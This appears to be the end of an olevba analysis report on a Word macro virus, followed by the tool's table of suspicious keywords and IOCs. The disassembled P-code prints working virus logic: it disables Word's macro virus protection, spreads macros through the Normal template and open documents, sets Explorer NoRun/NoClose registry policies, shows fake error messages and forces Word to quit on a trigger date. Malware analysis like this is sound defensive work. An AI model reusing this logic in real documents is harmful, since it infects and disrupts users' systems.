' Line #181:
' 	EndSub 
' Line #182:
' Line #183:
' 	FuncDefn (Sub FileNew())
' Line #184:
' 	OnError (Resume Next) 
' Line #185:
' 	ArgsCall nstl 0x0000 
' Line #186:
' 	LitDI2 0x004F 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd show 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	Ld ActiveDocument 
' 	ArgsCall copymac 0x0002 
' 	EndIf 
' Line #187:
' 	ArgsCall stl 0x0000 
' Line #188:
' 	EndSub 
' Line #189:
' Line #190:
' 	FuncDefn (Sub FileNewDefault())
' Line #191:
' 	OnError (Resume Next) 
' Line #192:
' 	ArgsCall show 0x0000 
' Line #193:
' 	Ld WordBasic 
' 	ArgsMemCall FileNewDefault 0x0000 
' Line #194:
' 	Ld NormalTemplate 
' 	Ld ActiveDocument 
' 	ArgsCall copymac 0x0002 
' Line #195:
' 	EndSub 
' Line #196:
' Line #197:
' 	FuncDefn (Sub ToolsOptions())
' Line #198:
' 	OnError (Resume Next) 
' Line #199:
' 	ArgsCall nstl 0x0000 
' Line #200:
' 	LitDI2 0x03CE 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall show 0x0000 
' Line #201:
' 	ArgsCall stl 0x0000 
' Line #202:
' 	ArgsCall show 0x0000 
' Line #203:
' 	EndSub 
' Line #204:
' Line #205:
' 	FuncDefn (Sub FilePrint())
' Line #206:
' 	OnError (Resume Next) 
' Line #207:
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	LitDI2 0x0037 
' 	Gt 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	LitDI2 0x0005 
' 	Lt 
' 	Or 
' 	IfBlock 
' Line #208:
' 	SetStmt 
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	Set aw 
' Line #209:
' 	SetStmt 
' 	Ld Selection 
' 	Set S 
' Line #210:
' 	LitDI2 0x0009 
' 	Ld aw 
' 	MemSt SeekView 
' Line #211:
' 	Ld mname 
' 	Ld S 
' 	ArgsMemCall TypeText 0x0001 
' Line #212:
' 	LitDI2 0x000A 
' 	Ld aw 
' 	MemSt SeekView 
' Line #213:
' 	Ld usht 
' 	Ld S 
' 	ArgsMemCall TypeText 0x0001 
' Line #214:
' 	LitDI2 0x0000 
' 	Ld aw 
' 	MemSt SeekView 
' Line #215:
' 	EndIfBlock 
' Line #216:
' 	LitDI2 0x0058 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall show 0x0000 
' Line #217:
' 	EndSub 
' Line #218:
' Line #219:
' 	FuncDefn (Sub NoRun())
' Line #220:
' 	OnError (Resume Next) 
' Line #221:
' 	StartWithExpr 
' 	Ld System 
' 	With 
' Line #222:
' 	LitStr 0x0001 "1"
' 	LitStr 0x0000 ""
' 	Ld hkcu 
' 	Ld sm 
' 	Concat 
' 	Ld cv 
' 	Concat 
' 	LitStr 0x0012 "Policies\Explorer\"
' 	Concat 
' 	LitStr 0x0007 "NoClose"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #223:
' 	LitStr 0x0001 "1"
' 	LitStr 0x0000 ""
' 	Ld hkcu 
' 	Ld sm 
' 	Concat 
' 	Ld cv 
' 	Concat 
' 	LitStr 0x0012 "Policies\Explorer\"
' 	Concat 
' 	LitStr 0x0005 "NoRun"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #224:
' 	LitStr 0x0011 "Microsoft Network"
' 	LitStr 0x0000 ""
' 	Ld hklm 
' 	LitStr 0x000E "Network\Logon\"
' 	Concat 
' 	LitStr 0x000F "PrimaryProvider"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #225:
' 	LitStr 0x0004 "SHT-"
' 	Ld mname 
' 	Concat 
' 	LitStr 0x0000 ""
' 	Ld hklm 
' 	LitStr 0x000E "Network\Logon\"
' 	Concat 
' 	LitStr 0x0008 "username"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #226:
' 	Ld mname 
' 	LitDI2 0x0001 
' 	LitDI2 0x0006 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0000 ""
' 	Ld hkcu 
' 	LitStr 0x001C "Control Panel\International\"
' 	Concat 
' 	LitStr 0x0005 "s1159"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #227:
' 	Ld mname 
' 	LitDI2 0x0001 
' 	LitDI2 0x0006 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0000 ""
' 	Ld hkcu 
' 	LitStr 0x001C "Control Panel\International\"
' 	Concat 
' 	LitStr 0x0005 "s2359"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #228:
' 	EndWith 
' Line #229:
' 	EndSub 
' Line #230:
' Line #231:
' 	FuncDefn (Sub err())
' Line #232:
' 	LitStr 0x0043 "This program has performed an illegal operation and will shut down."
' 	LitDI2 0x0010 
' 	Ld mw 
' 	ArgsCall MsgBox 0x0003 
' Line #233:
' 	EndSub 
' Line #234:
' Line #235:
' 	FuncDefn (Sub norcap())
' Line #236:
' 	OnError (Resume Next) 
' Line #237:
' 	Ld mw 
' 	Ld Application 
' 	MemSt Caption 
' Line #238:
' 	LitDI2 0x0002 
' 	Ld System 
' 	MemSt Cursor 
' Line #239:
' 	EndSub 
' Line #240:
' Line #241:
' 	FuncDefn (Sub chcap(tcap As String))
' Line #242:
' 	OnError (Resume Next) 
' Line #243:
' 	Ld mw 
' 	LitStr 0x0003 " - "
' 	Concat 
' 	Ld tcap 
' 	Concat 
' 	Ld Application 
' 	MemSt Caption 
' Line #244:
' 	EndSub 
' Line #245:
' Line #246:
' 	FuncDefn (Sub show())
' Line #247:
' 	OnError (Resume Next) 
' Line #248:
' 	SetStmt 
' 	Ld Application 
' 	Set ap 
' Line #249:
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	LitDI2 0x000F 
' 	Lt 
' 	IfBlock 
' Line #250:
' 	Ld lsht 
' 	ArgsCall chcap 0x0001 
' Line #251:
' 	Ld Now 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0005 
' 	ArgsLd TimeSerial 0x0003 
' 	Add 
' 	LitStr 0x0006 "norcap"
' 	Ld ap 
' 	ArgsMemCall OnTime 0x0002 
' Line #252:
' 	EndIfBlock 
' Line #253:
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	LitDI2 0x000F 
' 	Ge 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	LitDI2 0x001E 
' 	Le 
' 	And 
' 	IfBlock 
' Line #254:
' 	Ld mname 
' 	ArgsCall chcap 0x0001 
' Line #255:
' 	Ld Now 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0005 
' 	ArgsLd TimeSerial 0x0003 
' 	Add 
' 	LitStr 0x0006 "norcap"
' 	Ld ap 
' 	ArgsMemCall OnTime 0x0002 
' Line #256:
' 	EndIfBlock 
' Line #257:
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	LitDI2 0x001E 
' 	Gt 
' 	IfBlock 
' Line #258:
' 	Ld site 
' 	ArgsCall chcap 0x0001 
' Line #259:
' 	Ld Now 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0005 
' 	ArgsLd TimeSerial 0x0003 
' 	Add 
' 	LitStr 0x0006 "norcap"
' 	Ld ap 
' 	ArgsMemCall OnTime 0x0002 
' Line #260:
' 	EndIfBlock 
' Line #261:
' 	LitStr 0x003F "Have a nice day for all my friends in Pakuan University, Bogor."
' 	Ld Application 
' 	MemSt StatusBar 
' Line #262:
' 	LitDI2 0x0002 
' 	Ld System 
' 	MemSt Cursor 
' Line #263:
' 	ArgsCall bday 0x0000 
' Line #264:
' 	EndSub 
' Line #265:
' Line #266:
' 	FuncDefn (Sub amt())
' Line #267:
' 	OnError (Resume Next) 
' Line #268:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #269:
' 	EndSub 
' Line #270:
' Line #271:
' 	FuncDefn (Sub amf())
' Line #272:
' 	OnError (Resume Next) 
' Line #273:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #274:
' 	EndSub 
' Line #275:
' Line #276:
' 	FuncDefn (Sub stl())
' Line #277:
' 	OnError (Resume Next) 
' Line #278:
' 	Dim 
' 	VarDefn windir (As String)
' Line #279:
' 	LitStr 0x0000 ""
' 	Ld hklm 
' 	Ld sm 
' 	Concat 
' 	Ld cv 
' 	Concat 
' 	LitStr 0x000A "SystemRoot"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St windir 
' Line #280:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #281:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #282:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #283:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #284:
' 	LitVarSpecial (False)
' 	MemStWith SavePropertiesPrompt 
' Line #285:
' 	Ld windir 
' 	LitStr 0x0007 "\System"
' 	Concat 
' 	LitDI2 0x0008 
' 	ArgsMemStWith DefaultFilePath 0x0001 
' Line #286:
' 	EndWith 
' Line #287:
' 	EndSub 
' Line #288:
' Line #289:
' 	FuncDefn (Sub nstl())
' Line #290:
' 	OnError (Resume Next) 
' Line #291:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #292:
' 	LitVarSpecial (True)
' 	MemStWith VirusProtection 
' Line #293:
' 	LitVarSpecial (True)
' 	MemStWith SaveNormalPrompt 
' Line #294:
' 	LitVarSpecial (True)
' 	MemStWith ConfirmConversions 
' Line #295:
' 	LitVarSpecial (True)
' 	MemStWith SavePropertiesPrompt 
' Line #296:
' 	LitDI2 0x0006 
' 	ArgsMemLdWith DefaultFilePath 0x0001 
' 	LitStr 0x0008 "\Startup"
' 	Concat 
' 	LitDI2 0x0008 
' 	ArgsMemStWith DefaultFilePath 0x0001 
' Line #297:
' 	EndWith 
' Line #298:
' 	EndSub 
' Line #299:
' Line #300:
' 	FuncDefn (Sub norattr(noby As Object))
' Line #301:
' 	OnError (Resume Next) 
' Line #302:
' 	Ld noby 
' 	MemLd FullName 
' 	Ld vbArchive 
' 	ArgsCall SetAttr 0x0002 
' Line #303:
' 	EndSub 
' Line #304:
' Line #305:
' 	FuncDefn (Sub bday())
' Line #306:
' 	OnError (Resume Next) 
' Line #307:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0009 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000A 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #308:
' 	Dim 
' 	VarDefn msg (As String)
' 	VarDefn ent (As String)
' 	VarDefn quo (As String)
' Line #309:
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	St ent 
' Line #310:
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	St quo 
' Line #311:
' 	LitStr 0x0025 "Selamat ulang tahun aku ucapkan untuk"
' 	Ld ent 
' 	Concat 
' 	St msg 
' Line #312:
' 	Ld msg 
' 	LitStr 0x001D "orang yang sangat aku cintai "
' 	Concat 
' 	Ld quo 
' 	Concat 
' 	LitStr 0x0003 "SHT"
' 	Concat 
' 	Ld quo 
' 	Concat 
' 	LitStr 0x0001 "."
' 	Concat 
' 	Ld ent 
' 	Concat 
' 	St msg 
' Line #313:
' 	Ld msg 
' 	LitStr 0x0026 "Semoga panjang umur dan sukses selalu."
' 	Concat 
' 	Ld ent 
' 	Concat 
' 	St msg 
' Line #314:
' 	Ld msg 
' 	LitStr 0x0031 "Untuk itu sebaiknya anda meliburkan diri hari ini"
' 	Concat 
' 	Ld ent 
' 	Concat 
' 	St msg 
' Line #315:
' 	Ld msg 
' 	LitStr 0x0029 "dan memberikan ucapan selamat juga untuk "
' 	Concat 
' 	Ld quo 
' 	Concat 
' 	LitStr 0x0003 "SHT"
' 	Concat 
' 	Ld quo 
' 	Concat 
' 	LitStr 0x0001 "."
' 	Concat 
' 	St msg 
' Line #316:
' 	Ld msg 
' 	Ld ent 
' 	Concat 
' 	LitStr 0x000C "Terimakasih."
' 	Concat 
' 	St msg 
' Line #317:
' 	Ld msg 
' 	LitDI2 0x0040 
' 	Ld usht 
' 	ArgsCall MsgBox 0x0003 
' Line #318:
' 	Ld Now 
' 	LitDI2 0x0000 
' 	LitDI2 0x0005 
' 	LitDI2 0x0000 
' 	ArgsLd TimeSerial 0x0003 
' 	Add 
' 	LitStr 0x0007 "appexit"
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #319:
' 	LitDI2 0x0002 
' 	Ld System 
' 	MemSt Cursor 
' Line #320:
' 	EndIfBlock 
' Line #321:
' 	EndSub 
' Line #322:
' Line #323:
' 	FuncDefn (Sub appexit())
' Line #324:
' 	OnError (Resume Next) 
' Line #325:
' 	Dim 
' 	VarDefn i (As Integer)
' 	VarDefn andoc (As Object)
' Line #326:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #327:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #328:
' 	SetStmt 
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	Set andoc 
' Line #329:
' 	LitVarSpecial (True)
' 	Ld andoc 
' 	MemSt Saved 
' Line #330:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #331:
' 	EndIfBlock 
' Line #332:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #333:
' 	EndSub 
' Line #334:
' Line #335:
' 	FuncDefn (Sub VBFalse())
' Line #336:
' 	OnError (Resume Next) 
' Line #337:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #338:
' 	EndSub 
' Line #339:
' Line #340:
' 	FuncDefn (Sub Infectall())
' Line #341:
' 	OnError (Resume Next) 
' Line #342:
' 	Dim 
' 	VarDefn i (As Integer)
' 	VarDefn andoc (As Object)
' Line #343:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #344:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #345:
' 	SetStmt 
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	Set andoc 
' Line #346:
' 	Ld andoc 
' 	ArgsLd rasc 0x0001 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	Ld andoc 
' 	ArgsCall copymac 0x0002 
' 	EndIf 
' Line #347:
' 	Ld andoc 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld andoc 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #348:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #349:
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	LitDI2 0x0037 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	Ld pdnu 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld isoft 
' 	Concat 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' 	EndIf 
' Line #350:
' 	EndIfBlock 
' Line #351:
' 	EndSub 
' Line #352:
' Line #353:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://rascal321.cjb|URL                                          |
|          |.net                |                                             |
|IOC       |Dxdlg32.dll         |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

